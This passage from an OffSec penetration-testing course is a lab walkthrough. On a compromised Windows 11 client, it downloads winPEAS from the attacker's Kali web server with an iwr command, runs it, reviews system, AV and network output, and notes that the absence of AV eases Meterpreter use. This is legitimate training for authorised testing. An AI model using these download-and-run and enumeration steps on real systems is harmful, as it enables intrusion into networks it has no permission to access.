
# OffSec

Penetration Testing with Kali Linux

For this Learning Unit, we'll not explicitly [documentate] every result in our workspace directory on Kali. However, to get used to the documenting process you should create notes of all findings and information while following along.

Let's start with enumerating the CLIENTWK1 machine. Let's copy the 64-bit winPEAS executable to the directory served by the Python3 web server. On CLIENTWK1, we'll change the current directory to the home directory for marcus and download winPEAS from our Kali machine. Once downloaded, we'll launch it.

```powers
PS C:\Windows\System32\PowerShell\v1.0> cd C:\Users\marcus
 C:\Users\marcus
```

```powers
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
```

```powers
PS C:\Users\marcus> .\winPEAS.exe
.\winPEAS.exe
```

Listing 906 - Downloading and executing winPEAS

Let's review some of the results provided by winPEAS. We'll start with the Basic System Information section.

### Basic System Information
Check if the Windows versions is vulnerable to some known exploit at https://github.hacktricks.xyz/hardening-windows-local-privilege-escalation/kernel-exploits
Hostname: CLIENTWK1
Domain Name: beyond.com
ProductName: Windows 10 Pro
EditionID: Professional

Listing 907 - Basic System Information

Listing 907 shows that winPEAS detected CLIENTWK1's operating system as Windows 10. As we have learned in the course, winPEAS may falsely detect Windows 11 as Windows 10, so we'll manually check the operating system with systeminfo.

```powers
PS C:\Users\marcus> systeminfo
systeminfo
```

| Host Name: CLIENTWK1 |
| :--- |
| OS Name: Microsoft Windows 11 Pro |
| OS Version: 10.0.22000 N/A Build 22000 |

Listing 908 - Operating System Information

Indeed, Windows 11 is the operating system on CLIENTWK1. If we had blindly relied on the winPEAS results, we may have made the wrong assumptions from the beginning.

With experience, a penetration tester will develop a sense for which information from automated tools should be double-checked.

Going back to review the winPEAS output, we come across the AV section.

### AV Information
[X] Exception: Object reference not set to an instance of an object.
No AV was detected!!

| Listing 909 - AV Information |

No AV has been detected. This will make the use of other tools and payloads as Meterpreter much easier.

Let's review the network information such as Network Interfaces and known hosts and DNS cached.

### Network Interfaces and known hosts
The masks are only for the IPv4 addresses
Ethernet0[00:50:56:8A:AF:27]: 172.16.6.243 / 255.255.255.250
Gateways: 172.16.6.240
DNS: 172.16.6.240
Known hosts:

| 169.254.255.255 | 00-00-00-00-00-00 | Invalid |
| 172.16.6.240 | 00-50-56-8A-08-34 | Dynamic |
| 172.16.6.240 | 00-50-56-8A-DA-71 | Dynamic |
| 172.16.6.255 | FF-FF-FF-FF-FF-FF | Static |

DNS cached --limit 70-
| Entry Name | Data |
| :--- | :--- |
| CSRV1.beyond.com | 172.16.6.240 |
| mailssrv1.beyond.com | 172.16.6.254 |

| Listing 910 - Network Interfaces, known hosts, and DNS Cache |

Furthermore, MAILSRV is detected with the internal IP address of 172.16.6.254 and enumerated the machine from an external perspective via 192.168.50.242, we can safely assume that this is a dual-homed host.

As we did for credentials, we create a text file computer.txt in /home/kali/beyond/ to document identified machines and additional information about them.

```bash
kali@kali~$ cat computer.txt
172.16.6.240 - DCSRV.BEYOND.COM
-> Domain Controller
```

172.16.6.254 - MAILSRV1.BEYONDCOM
-> Mail Server
-> Dual Hosted Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User_marcus_ fetches emails on this machine
Listing 911 - List containing the most important information about identified target machines

Reviewing the rest of the winPEAS results, we don't find any actionable information to attempt a potential privilege escalation attack. However, we should remind ourselves that we are in a simulated penetration test and not in a CTF lab. Therefore, it is not necessary to ensure administrative privileges on every machine.

> While we skipped over the winPEAS results, we should examine the results thoroughly as we would in a real penetration test. After the local enumeration of the system, we should have obtained key pieces of information, which we listed in the Situational awareness section of the Windows Privilege Escalation Module.

Since we haven't identified a privilege escalation vector via winPEAS and there is nothing actionable on the system, such as a Password Manager, let's start enumerating the AD environment and its objects.

We learned several techniques in course to perform this kind of enumeration. For this Module, we used BloodHound with the SharpHound.
